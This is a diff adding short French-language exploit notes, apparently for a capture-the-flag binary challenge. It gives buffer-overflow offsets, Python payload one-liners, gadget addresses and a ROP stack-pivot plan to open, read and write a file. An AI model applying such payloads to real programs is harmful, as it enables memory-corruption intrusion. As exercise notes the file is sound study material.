@@ -1,0 +1,23 @@
+python -c "import struct;print 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0A' + struct.pack('<L', 0x08048590)" + 'bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'"
+
+
+--> eip reecrit a offset 44
+--> ebp reecrit a offset 47
+
+
+ r < <(python -c "import struct,sys;sys.stdout.write('X' * 37 + struct.pack('<L', 0xaa000000) + 'B' * 96)")
+
+
+--> faire un rop avec read ---> stack pivot et open('file') , read('file') , write('file')
+
+longueur section writable --->0x804affc - 0x804a10c
+
+@read.plt 0x080483b0
+@leave;ret 0x08048498
+@pop ebp;ret 0x080486ef
+@destination 0x804a20c
+
+r < <(python -c "from pwn import *;import sys;sys.stdout.write('X' * 37 + pack(0xaa000000) + 'CCC' + pack(0x080483b0) + 'BBBB' + pack(0x00000000) + pack(0x804a21c) + pack(0x80)")
+
+
+(voir game.py)
